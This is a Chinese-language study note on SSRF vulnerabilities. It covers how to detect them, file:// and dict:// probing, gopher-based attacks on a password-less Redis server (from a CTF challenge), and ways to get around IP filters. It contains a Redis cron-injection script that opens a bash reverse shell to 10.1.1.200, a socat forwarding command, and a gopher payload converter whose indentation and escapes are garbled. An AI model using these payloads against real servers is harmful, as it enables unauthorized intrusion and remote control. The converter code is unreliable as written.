# SSRF 漏洞

### 预备知识

bash 相关知识：[linux反弹shell](https://blog.csdn.net/Auuuuuuuu/article/details/89059176)        [反弹shell](https://blog.csdn.net/God_XiangYu/article/details/100151075?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight)

## 0x01 定义

SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。

## 0x02 漏洞判断

- 回显
- 延时(谷歌访问不到，百度迅速返回)
- DNS

## 0x03 相关函数

```
file_get_contents 既可以读取文件，又可以发起请求
fsockopen 打开一个网络链接
curl_exec
```

常用linux操作

```
常用的linux操作：
nc -lvp 1234 #监听1234端口
netstat -tunlp #检测端口开放情况
tcpdump  -nne  -i  eth0  port  6666 #抓6666的包
```

## 0x04 危害

1. 扫描开放端口，扫描服务
2. file:///协议读取文件，**gopher**万精油协议

```
file:///etc/passwd
dict://127.0.0.1:80
```

​	dict协议可以探测开放的端口

3.gopher 协议

<img src="https://i.loli.net/2020/12/27/o4eshfdajqnpLXc.png" alt="image.png" style="zoom:67%;" />

#### 对于redis的一个利用

参考题目：2020网鼎杯地SSRFME

**限制**：

- redis无密码

- cron 反弹shell

- web ssrf->gopher

  ```
  #shell.sh
  echo -e "\n\n\n*1/ * * * * bash -i >& /dev/tcp/10.1.1.200/666  0>&1\n\n\n\n"|/usr/redis/redis-cli -h $1 -p $2 -x set 1
  /usr/redis/redis-cli -h $1 -p $2 config set dir /var/spool/cron/
  /usr/redis/redis-cli -h $1 -p $2 config set dbfilename root
  /usr/redis/redis-cli -h $1 -p $2 save
  /usr/redis/redis-cli -h $1 -p $2 quit
  """ 在Redis的第0个数据库中添加key为1，名为root的定时任务，value字段最后会多一个n是因为echo重定向最后会自带一个换行符，位置为CentOS机器的/var/spool/cron/，10.1.1.200为获取反弹shell的本地IP地址，666为反弹shell的监听端口，可随意设置。"""
  -h host -p port 
  $1 $2 是命令行传入的参数
  ```

具体内容查看redis攻防目录

`socat  -v tcp-listen:2333,fork  tcp-connect:127.0.0.1:6379 将本地的2333端口转发到Redis服务器的6379端口，访问本地的2333端口其实是访问Redis服务器的6379端口。`

协议转换脚本

```
#coding: utf-8
#author: JoyChou
#usage:    python tran2gopher.py socat.log
import sys

exp = ''

with open(sys.argv[1]) as f:
for line in f.readlines():
if line[0] in '><+':
continue
# 判断倒数第2、3字符串是否为r
elif line[-3:-1] == r'r':
# 如果该行只有r，将r替换成%0a%0d%0a
if len(line) == 3:
exp = exp + '%0a%0d%0a'
else:
line = line.replace(r'r', '%0d%0a')
# 去掉最后的换行符
line = line.replace('n', '')
exp = exp + line
# 判断是否是空行，空行替换为%0a
elif line == 'x0a':
exp = exp + '%0a'
else:
line = line.replace('n', '')
exp = exp + line
print exp
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2354192/1598520163942-7f260329-ce30-4920-ae66-5e99ff4ea4e4.png)

## 0x05 bypass

### IP限制

```
• 添加端口，如果不加，默认80口，绕过对IP的限制
• 短网址（但是有时候不支持302）
• 指向任意ip地址的xip.io域名（DNS解析）
• IP限制绕过
• IP地址进制转换127.0.0.1 =》八进制：0177.0.0.1
• 十六进制=》0x7f000001
• 十进制：源地址=》十六进制=》十进制
• 结合协议
• http://www.baidu.com@192.168.0.1/以什么用户名访问某一个网站
 DNS rebiding
 字符编码 https://www.cnblogs.com/dem0/p/14196924.html
```

